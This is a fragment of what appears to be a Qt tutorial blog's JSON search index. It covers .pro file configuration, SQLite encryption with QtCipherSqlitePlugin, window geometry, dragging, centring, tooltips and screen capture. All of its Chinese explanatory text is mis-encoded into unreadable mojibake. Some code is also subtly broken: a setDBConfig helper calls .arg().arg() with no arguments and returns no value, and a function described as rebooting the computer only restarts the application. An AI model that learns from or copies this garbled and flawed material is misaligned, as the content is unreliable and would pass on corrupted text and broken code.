ä½¿ç”¨è¯­è¨€æ–‡ä»¶ï¼ˆQTranslatorï¼‰","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘proæ–‡ä»¶ç”¨æ³•","date":"2023-10-27T01:24:02.318Z","path":"B_Code/Qt/ã€Qtã€‘proæ–‡ä»¶ç”¨æ³•/","text":"[toc] å®åˆ¤æ–­ 12345if(contains(DEFINES,OEM_Config)) &#123; FORMS += $$PWD/Form.ui HEADERS += $$PWD/Form.h SOURCES += $$PWD/Form.cpp&#125; proæ–‡ä»¶è½¬vcprojä¹‹åçš„é…ç½® å¸¸è§„é¡¹ 1234# è®¾ç½®å·¥å…·é›†ä¸º$(DefaultPlatformToolset)# è®¾ç½®sdkç‰ˆæœ¬$([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) ç”Ÿæˆå‰äº‹ä»¶ 1call $(SolutionDir)prompt.bat prompt.bat 123456789101112131415@echo offecho -----------------------------------------------------echo [TrustAgent.pro] æ–‡ä»¶æœ‰æ›´æ–°æ—¶ï¼Œè¯·é‡æ–°ç”Ÿæˆå½“å‰å·¥ç¨‹echo ä»¥ä¸‹é…ç½®å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰äººï¼Œå¦‚æœ‰ç¼–è¯‘æŠ¥é”™ï¼Œè¯·è‡ªè¡Œä¿®æ”¹ã€‚echo 1. Qtå·¥å…·é›†é»˜è®¤é…ç½®ä¸ºç¯å¢ƒå˜é‡QtPath: å½“å‰ç³»ç»ŸQtPath:[%QtPath%] ï¼ˆæ¨è 5.9.9_msvc2015ï¼‰echo 2. å·¥å…·é›†é»˜è®¤é…ç½®ä¸º: $(DefaultPlatformToolset) ï¼ˆæ¨è 10.0.19041.0åŠä»¥ä¸Šï¼‰echo 3. SDKé»˜è®¤é…ç½®ä¸º: $([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) ï¼ˆæ¨è V142ï¼‰echo -----------------------------------------------------@REM if &quot;%QtPath%&quot; == &quot;&quot; (@REM choice /c:yn /m &quot;å½“å‰æœªé…ç½®ç¯å¢ƒå˜é‡ï¼Œæ˜¯å¦æ‰“å¼€ç³»ç»Ÿé…ç½®é¡µé¢ï¼š&quot;@REM if %errorlevel%==1 (@REM start ms-settings:about@REM )@REM )","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"é…ç½®","slug":"é…ç½®","permalink":"https://hodlyounger.github.io/tags/%E9%85%8D%E7%BD%AE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘SQLite3 æ•°æ®åº“åŠ å¯†","date":"2023-10-27T01:24:02.249Z","path":"B_Code/Qt/ã€Qtã€‘åŠ å¯†/","text":"Set Connect options Provided by Qt SqlitePlugin QSQLITE_BUSY_TIMEOUT QSQLITE_OPEN_READONLY QSQLITE_OPEN_URI QSQLITE_ENABLE_SHARED_CACHE Added by QtCipherSqlitePlugin QSQLITE_CREATE_KEY QSQLITE_UPDATE_KEY QSQLITE_REMOVE_KEY åˆ›å»ºæ•°æ®åº“å¯†ç  QSQLITE_CREATE_KEY å¦‚æœè¾“å‡ºä¸­æœ‰ SQLITECIPHER çš„åå­—ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œæ’ä»¶æ²¡æœ‰é—®é¢˜ï¼ ä¸ºæ²¡æœ‰åŠ å¯†çš„æ•°æ®åº“å¢åŠ å¯†ç  Qt é»˜è®¤æä¾›çš„ SQLite æ’ä»¶æ˜¯æ²¡æœ‰åŠ å¯†åŠŸèƒ½çš„ã€‚æ–°ç‰ˆæœ¬çš„ QtCipherSqlitePlugin æ”¯æŒä¸ºåŸæœ¬æ²¡æœ‰åŠ å¯†çš„æ•°æ®åº“å¢åŠ å¯†ç ï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š C++ 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_CREATE_KEY&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; ä¸Šé¢çš„ä»£ç ï¼Œæˆ‘ä»¬ä½¿ç”¨ test.db æ•°æ®åº“ï¼Œå°†å¯†ç è®¾ç½®ä¸º testï¼ŒåŒæ—¶æŒ‡å®šè¿æ¥é€‰é¡¹ä¸º QSQLITE_CREATE_KEY ã€‚æ­¤æ—¶ï¼Œè°ƒç”¨ open() å‡½æ•°ä¹‹åï¼ŒQtCipherSqlitePlugin å°†ä½¿ç”¨æ”¹å¯†ç ä¸ºè¿™ä¸ªæ•°æ®åº“è¿›è¡ŒåŠ å¯†ã€‚ åˆ é™¤æ•°æ®åº“å¯†ç  QSQLITE_REMOVE_KEY QtCipherSqlitePlugin å¯ä»¥åˆ é™¤æ•°æ®åº“å¯†ç ï¼Œæ­¤æ—¶éœ€è¦æä¾›åŸå¯†ç ï¼Œå¹¶ä½¿ç”¨è¿æ¥é€‰é¡¹ QSQLITE_REMOVE_KEY ï¼Œå¦‚ä¸‹ï¼š 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_REMOVE_KEY&quot;);if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; æ›´æ–°æ•°æ®åº“å¯†ç  QSQLITE_UPDATE_KEY QtCipherSqlitePlugin å¯ä»¥æ›´æ–°æ•°æ®åº“åŸæœ‰å¯†ç ï¼Œéœ€è¦è®¾ç½®åŸå¯†ç ï¼Œå¹¶ä¸”ä½¿ç”¨è¿æ¥é€‰é¡¹ QSQLITE_UPDATE_KEY è®¾ç½®æ–°å¯†ç ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_UPDATE_KEY=newtest&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; å¦‚æœåŸå¯†ç ä¸æ­£ç¡®ï¼ŒQtCipherSqlitePlugin ä¼šç›´æ¥è¿”å›é”™è¯¯ã€‚ å¦‚æœæ–°å¯†ç è®¾ç½®ä¸ºç©ºï¼Œä¾‹å¦‚ QSQLITE_UPDATE_KEY= ï¼Œåˆ™ä½œç”¨ç­‰åŒäºåˆ é™¤å¯†ç ã€‚ 1234567891011121314151617bool QUpdateDB::setDBConfig(QSqlDatabase* dbconn, QMap&lt;ENUM_SQLKEY, QString&gt; qMapCfg)&#123; for (auto it : qMapCfg.toStdMap()) &#123; if (it.first &lt;= QSQLITE_REMOVE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(GETOBJNAME(it.first)); &#125; else if (it.first == QSQLITE_UPDATE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(QString(&quot;%1=%2&quot;).arg().arg()); &#125; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æ•°æ®åº“/SQLite3","slug":"æ•°æ®åº“-SQLite3","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-SQLite3/"},{"name":"å¼€æº","slug":"å¼€æº","permalink":"https://hodlyounger.github.io/tags/%E5%BC%80%E6%BA%90/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘é‡å¯","date":"2023-10-27T01:24:02.249Z","path":"B_Code/Qt/ã€Qtã€‘é‡å¯/","text":"Qt å®ç°ç”µè„‘é‡å¯ï¼ˆéœ€è¦ç®¡ç†å‘˜ï¼‰ 12345678inline void reboot()&#123; QString program = QApplication::applicationFilePath(); QStringList arguments = QApplication::arguments(); QString workingDirectory = QDir::currentPath(); QProcess::startDetached(program, arguments, workingDirectory); QApplication::exit();&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘è·å–æ§ä»¶ä½ç½®","date":"2023-10-27T01:24:02.248Z","path":"B_Code/Qt/ã€Qtã€‘è·å–æ§ä»¶ä½ç½®/","text":"Qt è·å–çª—å£ã€ç³»ç»Ÿå±å¹•å¤§å°å°ºå¯¸ä¿¡æ¯ï¼ŒQtè·å–æ§ä»¶ä½ç½®åæ ‡ã€å±å¹•åæ ‡ï¼Œç›¸å¯¹çˆ¶çª—ä½“åæ ‡ [toc] ä¸€ã€è·å–çª—å£å¤§å°å°ºå¯¸ä¿¡æ¯ Qt çª—å£å°ºå¯¸ï¼Œçª—å£å¤§å°å’Œå¤§å°æ”¹å˜å¼•èµ·çš„äº‹ä»¶ QResizeEventã€‚ æ¶‰åŠåæ ‡ã€é•¿å®½çš„æ¥å£ 12345678910111213//çª—å£å·¦ä¸Šè§’çš„ä½ç½®(å«è¾¹æ¡†)qDebug() &lt;&lt; this-&gt;frameGeometry().x() &lt;&lt; this-&gt;frameGeometry().y() &lt;&lt; ;//1qDebug() &lt;&lt; this-&gt;x() &lt;&lt; this-&gt;y();//2qDebug() &lt;&lt; this-&gt;pos().x() &lt;&lt; this-&gt;pos().y();//3//çª—å£çš„å®½åº¦å’Œé«˜åº¦(å«è¾¹æ¡†)qDebug() &lt;&lt; this-&gt;frameGeometry().width() &lt;&lt; this-&gt;frameGeometry().height();//çª—å£å·¦ä¸Šè§’çš„ä½ç½®(ä¸å«è¾¹æ¡†)qDebug() &lt;&lt; this-&gt;geometry().x() &lt;&lt; this-&gt;geometry().y();//çª—å£çš„å®½åº¦å’Œé«˜åº¦(ä¸å«è¾¹æ¡†)qDebug() &lt;&lt; this-&gt;geometry().width() &lt;&lt; this-&gt;geometry().height();//1qDebug() &lt;&lt; this-&gt;width() &lt;&lt; this-&gt;height();//2qDebug() &lt;&lt; this-&gt;rect().width() &lt;&lt; this-&gt;rect().height();//3qDebug() &lt;&lt; this-&gt;size().width() &lt;&lt; this-&gt;size().height();//4 Qtè·å–ç³»ç»Ÿå±å¹•å¤§å° QDesktopWidget æä¾›äº†è¯¦ç»†çš„ä½ç½®ä¿¡æ¯ï¼Œå…¶èƒ½å¤Ÿè‡ªåŠ¨è¿”å›çª—å£åœ¨ç”¨æˆ·çª—å£çš„ä½ç½®å’Œåº”ç”¨ç¨‹åºçª—å£çš„ä½ç½®ã€‚ 1234567QDesktopWidget* pDesktopWidget = QApplication::desktop();//è·å–å¯ç”¨æ¡Œé¢å¤§å°QRect deskRect = QApplication::desktop()-&gt;availableGeometry();//è·å–ä¸»å±å¹•åˆ†è¾¨ç‡QRect screenRect = QApplication::desktop()-&gt;screenGeometry();//è·å–å±å¹•æ•°é‡int nScreenCount = QApplication::desktop()-&gt;screenCount(); Qt5å¼€å§‹ï¼Œ QDesktopWidgetå®˜æ–¹ä¸å»ºè®®ä½¿ç”¨ï¼Œæ”¹ä¸º QScreen 12345678#include&lt;QScreen&gt;#include&lt;QRect&gt; QList&lt;QScreen *&gt; list_screen = QGuiApplication::screens(); //å¤šæ˜¾ç¤ºå™¨QRect rect = list_screen.at(0)-&gt;geometry();desktop_width = rect.width();desktop_height = rect.height();qDebug() &lt;&lt; desktop_width &lt;&lt;desktop_height; ä¸‰ã€è®¾ç½®çª—ä½“å¤§å° 1234567void setGeometry(int x, int y, int w, int h)void setGeometry(const QRect &amp;)void resize(int w, int h)void resize(const QSize &amp;) å››ã€Qtè·å–æ§ä»¶ä½ç½®åæ ‡ã€å±å¹•åæ ‡ã€ç›¸å¯¹çˆ¶çª—ä½“åæ ‡ è¿™ä¸ªåªæ˜¯è¿”å›ç›¸å¯¹è¿™ä¸ª widget ï¼ˆé‡è½½äº†QMouseEventçš„widgetï¼‰çš„ä½ç½®ã€‚ 1QPoint QMouseEvent::pos() çª—å£åæ ‡ï¼Œè¿™ä¸ªæ˜¯è¿”å›é¼ æ ‡çš„å…¨å±€åæ ‡ 1QPoint QMouseEvent::globalPos() ç›¸å¯¹æ˜¾ç¤ºå™¨çš„å…¨å±€åæ ‡ 1QPoint QCursor::pos() [static] å°†çª—å£åæ ‡è½¬æ¢æˆæ˜¾ç¤ºå™¨åæ ‡ 1QPoint QWidget::mapToGlobal(const QPoint &amp; pos) const å°†æ˜¾ç¤ºå™¨åæ ‡è½¬æ¢æˆçª—å£åæ ‡ 1QPoint QWidget::mapFromGlobal(const QPoint &amp; pos) const å°†çª—å£åæ ‡è·å¾—çš„posè½¬æˆçˆ¶ç±»widgetçš„åæ ‡ 1QPoint QWidget::mapFromParent(const QPoint &amp; pos) const å°†å½“å‰çª—å£åæ ‡è½¬æ¢æˆæŒ‡å®šparentåæ ‡ 1QPoint QWidget::mapTo(const QWidget * parent, const QPoint &amp;pos) const è¿™ä¸ªå±æ€§è·å¾—çš„æ˜¯å½“å‰ç›®å‰æ§ä»¶åœ¨çˆ¶çª—å£ä¸­çš„ä½ç½® 1const QPointF &amp;QMouseEvent::screenPos() const Returns the position of the mouse cursor asa QPointF, relative to the screen that received the event. å’Œ QPoint QMouseEvent::globalPos() å€¼ç›¸åŒï¼Œä½†æ˜¯ç±»å‹æ›´é«˜ç²¾åº¦çš„ QPointF This function was introduced in Qt 5.0. 1const QPointF &amp;QMouseEvent::screenPos() const è·å–å…¨å±€åæ ‡ 1QCursor::pos() == QMouseEvent::globalPos() å°†é¼ æ ‡çš„åæ ‡è½¬æ¢æˆå…¨å±€åæ ‡ 1QMouseEvent::globalPos() == ui.posBtn-&gt;mapToGlobal(ui.posBtn-&gt;pos()); å°†é¼ æ ‡åæ ‡ï¼ˆé¼ æ ‡å½“å‰åæ ‡ï¼ŒQCursor::pos()ï¼‰ç›´æ¥è½¬æ¢æˆå½“å‰çª—å£ç›¸å¯¹åæ ‡ 1ui.posBtn-&gt;mapFromGlobal(QCursor::pos());","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘å®ç°çª—å£æ‹–æ‹½","date":"2023-10-27T01:24:02.247Z","path":"B_Code/Qt/ã€Qtã€‘çª—å£æ‹–æ‹½/","text":"[toc] QTçª—å£é»˜è®¤å¯ä»¥ç›´æ¥é¼ æ ‡ç‚¹ä½çª—å£çš„æ ‡é¢˜æ å®ç°æ‹–æ‹½ç§»åŠ¨ï¼Œå¦‚æœéœ€è¦é¼ æ ‡ç‚¹ä½çª—å£å®¢æˆ·åŒºåŸŸå®ç°çª—å£çš„æ‹–æ‹½ç§»åŠ¨ï¼Œå¯ä»¥é€šè¿‡QMouseEventäº‹ä»¶æ¥å®ç°ã€‚ .hæ–‡ä»¶ 12345678910111213141516171819202122#include &lt;QWidget&gt; class QMouseEvent;class Widget : public QWidget&#123; Q_OBJECT public: Widget(QWidget *parent = 0); ~Widget(); protected: //æ‹–æ‹½çª—å£ void mousePressEvent(QMouseEvent *event); void mouseMoveEvent(QMouseEvent *event); void mouseReleaseEvent(QMouseEvent *event); private: bool m_bDrag; QPoint mouseStartPoint; QPoint windowTopLeftPoint;&#125;; .cppæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233//æ‹–æ‹½æ“ä½œvoid Widget::mousePressEvent(QMouseEvent *event)&#123; if(event-&gt;button() == Qt::LeftButton) &#123; m_bDrag = true; //è·å¾—é¼ æ ‡çš„åˆå§‹ä½ç½® mouseStartPoint = event-&gt;globalPos(); //mouseStartPoint = event-&gt;pos(); //è·å¾—çª—å£çš„åˆå§‹ä½ç½® windowTopLeftPoint = this-&gt;frameGeometry().topLeft(); &#125;&#125; void Widget::mouseMoveEvent(QMouseEvent *event)&#123; if(m_bDrag) &#123; //è·å¾—é¼ æ ‡ç§»åŠ¨çš„è·ç¦» QPoint distance = event-&gt;globalPos() - mouseStartPoint; //QPoint distance = event-&gt;pos() - mouseStartPoint; //æ”¹å˜çª—å£çš„ä½ç½® this-&gt;move(windowTopLeftPoint + distance); &#125;&#125; void Widget::mouseReleaseEvent(QMouseEvent *event)&#123; if(event-&gt;button() == Qt::LeftButton) &#123; m_bDrag = false; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æ‹–æ‹½","slug":"æ‹–æ‹½","permalink":"https://hodlyounger.github.io/tags/%E6%8B%96%E6%8B%BD/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘çª—å£å±…ä¸­æ˜¾ç¤º","date":"2023-10-27T01:24:02.247Z","path":"B_Code/Qt/ã€Qtã€‘çª—å£å±…ä¸­/","text":"ä¸€ã€è¿›è¡Œç•Œé¢å¸ƒå±€çš„æ—¶å€™ï¼Œå¾€å¾€éœ€è¦å°†ç•Œé¢æ˜¾ç¤ºåœ¨æ•´ä¸ªæ¡Œé¢çš„ä¸­å¿ƒä½ç½®ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸€ä¸‹å¤„ç† äºŒã€åŠ ä¸Šå¤´æ–‡ä»¶ 1#include &lt;QDesktopWidget&gt; ä¸‰ã€å†åœ¨æ„é€ å‡½æ•°ä¸­åŠ ä¸Šä»£ç  12QDesktopWidget *deskdop=QApplication::desktop();move((deskdop-&gt;width()-this-&gt;width())/2, (deskdop-&gt;height()-this-&gt;height())/2);","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"å¸ƒå±€","slug":"å¸ƒå±€","permalink":"https://hodlyounger.github.io/tags/%E5%B8%83%E5%B1%80/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘é¼ æ ‡ hover æ“ä½œæ—¶å¼¹å‡ºæ–‡å­—æ°”æ³¡","date":"2023-10-27T01:24:02.246Z","path":"B_Code/Qt/ã€Qtã€‘æ°”æ³¡/","text":"[TOC] éœ€æ±‚æè¿°ï¼šé¼ æ ‡ hover åœ¨ä¸€ä¸ªæ§ä»¶ä¸Šæ—¶ï¼Œå±•ç¤ºè®¾ç½®å¥½çš„æ°”æ³¡ä¿¡æ¯ æ¼”ç¤º ç›¸å…³è¯´æ˜ Qt5ä¹‹å‰çš„ç‰ˆæœ¬è¦è®¾ç½®æ°”æ³¡éœ€è¦é€šè¿‡C++ä¸­å…¶ä»–çš„ç±»åº“å»å®ç°ï¼Œåœ¨Qt5ä¸­åˆ™å·²ç»å®ç°äº†ç›¸å…³çš„Qtç±»ã€‚å¹¶ä¸”é™¤äº†è®¾ç½®æ–‡å­—æ°”æ³¡ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡é‡å†™ QToolTip ç±»å®ç°è‡ªå·±éœ€è¦çš„æ°”æ³¡æ ·å¼ã€‚ ä» Qt 5.9.9 å·²ç»æ”¯æŒ QToolTipã€‚åŸºæœ¬æ‰€æœ‰ç»§æ‰¿äº QWidget çš„ç»„ä»¶éƒ½å¯ä»¥é€šè¿‡ setToolTip()è®¾ç½®æ°”æ³¡ä¿¡æ¯ã€‚ä»¥ä¸‹æ‰€å±•ç¤ºçš„QtåŸºç±»éƒ½å¯ä»¥è®¾ç½®æ°”æ³¡ä¿¡æ¯ã€‚ setToolTip: QAction QGraphicsItem QListWidgetItem QStandardItem QSystemTrayIcon QTableWidgetItem QTextCharFormat QTreeWidgetItem QWidget QWinThumbnailToolButton setToolTipDuration: QWidget setToolTipsVisible: QMenu åŸºæœ¬ä¸Šæ‰€æœ‰ç»§æ‰¿äº QWidget çš„Qtæ§ä»¶ç±»éƒ½æ”¯æŒè®¾ç½®æ°”æ³¡ï¼Œæœ¬æ–‡ä»¥ QLabel å’Œ QPushButton ä¸ºä¾‹æ¼”ç¤ºæ–‡å­—æ°”æ³¡åŠŸèƒ½ã€‚ æ”¯æŒ SetToolTipçš„æ§ä»¶ ä»£ç  ä»£ç å¾ˆç®€å•ï¼Œåœ¨uiç•Œé¢æ‹–ä¸€ä¸ª QLabel å’Œä¸€ä¸ª QPushbutton å³å¯ï¼Œä¿¡å·æ§½ç›´æ¥åœ¨uiç•Œé¢å³å‡»è½¬åˆ°æ§½å³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;#include &lt;QImage&gt;#include &lt;QPixmap&gt;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); QPixmap img(&quot;:/Win11.jpg&quot;); ui-&gt;label-&gt;setPixmap(img); ui-&gt;label-&gt;setScaledContents(true); ui-&gt;label-&gt;setToolTip(QString(&quot;å£çº¸ã€ŠWin11.pngã€‹&quot;)); ui-&gt;pushButton-&gt;setToolTip(QString(&quot;éšè—æˆ–æ˜¾ç¤ºå›¾ç‰‡&quot;));&#125;Widget::~Widget()&#123; delete ui;&#125;void Widget::on_pushButton_clicked()&#123; if(ui-&gt;label-&gt;isVisible()) ui-&gt;label-&gt;hide(); else ui-&gt;label-&gt;setVisible(true);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"æ°”æ³¡","slug":"æ°”æ³¡","permalink":"https://hodlyounger.github.io/tags/%E6%B0%94%E6%B3%A1/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"ã€Qtã€‘æˆªå›¾","date":"2023-10-27T01:24:02.245Z","path":"B_Code/Qt/ã€Qtã€‘æˆªå›¾/","text":"è½¬è½½è‡ªï¼š QT æˆªå›¾ - ç°ä¿¡ç½‘ï¼ˆè½¯ä»¶å¼€å‘åšå®¢èšåˆï¼‰ (freesion.com) QT æˆªå›¾ ä¸€ã€ç®€è¦è¯´æ˜ ç®€å•çš„å®ç°æˆªå›¾åŠŸèƒ½ï¼ŒåŒ…æ‹¬å…¨å±æˆªå›¾ï¼ŒçŸ©å½¢åŒºåŸŸæˆªå›¾ï¼Œä¸»è¦ç¯å¢ƒï¼šwin7-32bitï¼ŒQT Creator5.2ã€‚ å·¥ç¨‹æºä»£ç  é“¾æ¥ï¼šhttps://pan.baidu.com/s/1xt-oyaz4pWNNFG4q85nmSA å¯†ç ï¼š6uky äºŒã€æ•ˆæœ è¿è¡Œæ•ˆæœ 1ã€ å…¨å±æˆªå›¾ 1234567891011//è·å–å…¨å±æˆªå›¾ QPixmapfullScreen = QPixmap::grabWindow(QApplication::desktop()-&gt;winId()); //æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡† QStringfileName = QFileDialog::getSaveFileName(this, &quot;æ–‡ä»¶å¦å­˜ä¸º&quot;,&quot;&quot;,tr(&quot;ConfigFiles (*.jpg)&quot;)); //ä¿å­˜æˆªå›¾ fullScreen.save(fileName,&quot;jpg&quot;); 2ã€ çŸ©å½¢æˆªå›¾ï¼šåœ¨å…¨å±æˆªå›¾çš„åŸºç¡€ä¸Šï¼Œåœ¨å…¨å±æˆªå›¾é€‰å–ä¸€ä¸ªçŸ©å½¢åŒºåŸŸ 1234567fullScreen.copy(rect).save(fileName);//rectæ˜¯ä¸€ä¸ªçŸ©å½¢ æˆ–è€…æ˜¯fullScreen.copy(x,y,width,height).save(fileName);//x,yä¸ºçŸ©å½¢å·¦ä¸Šè§’åæ ‡ï¼Œ widthä¸ºçŸ©å½¢å®½åº¦ï¼Œheightä¸ºçŸ©å½¢çš„é«˜åº¦ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ å±å¹•å·¦ä¸Šè§’ä¸ºï¼ˆ0,0ï¼‰ï¼Œx,yåˆ†åˆ«å‘å³ã€ä¸‹é€’å¢ã€‚ é‚£ä¹ˆå¦‚ä½•å®ç°ä»»æ„çš„çŸ©å½¢åŒºåŸŸå‘¢ï¼Ÿ å››ã€æ”¹è¿› 1ã€ ä»»æ„çŸ©å½¢åŒºåŸŸ æŒ‰ä¸‹é¼ æ ‡å·¦é”®ä¸æ”¾å¾—åˆ°ä¸€ä¸ªç‚¹P(x1,y1) æ‹–åŠ¨é¼ æ ‡ é‡Šæ”¾é¼ æ ‡å·¦é”®å¾—åˆ°å¦å¤–ä¸€ä¸ªç‚¹Q(x2,y2) å¦‚æ­¤å¾—åˆ°ä¸€ä¸ªä»¥Pã€Qä¸ºå¯¹è§’çš„çŸ©å½¢ 2ã€ å®ç°åŠ¨æ€çŸ©å½¢æ•ˆæœ æ‹‰ä¸Šä¸€å±‚åŠé€æ˜çš„é®ç½©(å…¶å®å°±æ˜¯ä¸€ä¸ªåŠé€æ˜çš„showFullScreençª—ä½“) æ³¨æ„ï¼šæ‹‰ä¸Šé®ç½©ä¹‹å‰åº”å°†çˆ¶çª—ä½“éšå»ï¼Œä¸ç„¶æ¯ä¸€å¼ å…¨å±æˆªå›¾éƒ½ä¼šæœ‰çˆ¶çª—ä½“ 1setWindowState(Qt::WindowMinimized);//æœ€å°åŒ–çˆ¶çª—ä½“ã€‚ ï¼ˆå¯èƒ½éœ€è¦å»¶æ—¶ï¼‰ å°†çŸ©å½¢å±€åŸŸé‡ç»˜(è¾¾åˆ°å»é™¤çŸ©å½¢åŒºåŸŸéƒ¨åˆ†çš„é®ç½©çš„æ•ˆæœ) 3ã€ å³é”®èœå•(å¤åˆ¶åˆ°å‰ªåˆ‡æ¿+å¦å­˜ä¸º+é€€å‡º)ä»¥åŠå¢åŠ å¿«æ·é”® **å¤åˆ¶åˆ°å‰ªåˆ‡æ¿ï¼š**QGuiApplication::clipboard()-&gt;setPixmap(fullScreen.copy(rect)); **ç»„åˆå¿«æ·é”®Ctrl+Cï¼š**if(****e-&gt;key()==Qt::Key_C&amp;&amp;e-&gt;modifiers()==Qt::ControlModifier) 4ã€ çŸ©å½¢æˆªå›¾æ—¶ï¼Œå®æ—¶æ˜¾ç¤ºé¼ æ ‡çš„ä½ç½®ã€çŸ©å½¢æˆªå›¾çš„ä½ç½®ä»¥åŠå¤§å°ä¿¡æ¯ **é€šè¿‡é¼ æ ‡ç§»åŠ¨äº‹ä»¶(è®¾ç½®é¼ æ ‡è½¨è¿¹è·Ÿè¸ªï¼š**setMouseTracking(true); update()è§¦å‘paintEventé‡ç»˜äº‹ä»¶ 5ã€ æ— è¾¹æ¡†çª—ä½“æ‹–åŠ¨ 123456789101112//å®ç°æ— è¾¹æ¡† (Qt::FramelessWindowHintå»è¾¹æ¡†) ã€Qt::WindowStaysOnTopHintçª—ä½“ç½®é¡¶ é˜²æ­¢æ‹–åˆ°ä»»åŠ¡æ ä¸‹é¢ this-&gt;setWindowFlags(Qt::FramelessWindowHint| Qt::WindowSystemMenuHint |Qt::WindowMinMaxButtonsHint|Qt::WindowStaysOnTopHint); //æ‹–åŠ¨(å®é™…ä¸Šæ˜¯æ ¹æ®é¼ æ ‡çš„ç§»åŠ¨ æ¥ç§»åŠ¨çª—ä½“) //å½“å‰é¼ æ ‡ç›¸å¯¹çª—ä½“çš„ä½ç½®-åˆšæŒ‰ä¸‹å·¦é”®æ—¶çš„ç›¸å¯¹ä½ç½®=é¼ æ ‡ç§»åŠ¨çš„å¤§å° move(e-&gt;pos()-beginPos+this-&gt;pos()); //é¼ æ ‡ç§»åŠ¨çš„å¤§å°+çª—ä½“åŸæ¥çš„ä½ç½®=çª—ä½“ç§»åŠ¨åçš„ä½ç½® 6ã€ çª—ä½“è´´è¾¹(å½“çª—ä½“é åœ¨å±å¹•ä¸Šè¾¹ï¼Œå¹¶ä¸”é¼ æ ‡ç¦»å¼€çª—ä½“æ—¶ï¼Œçª—ä½“è´´è¾¹ï¼Œå½“é¼ æ ‡è¿›å…¥çª—ä½“æ—¶ï¼Œçª—ä½“å…¨éƒ¨å±•ç¤º) 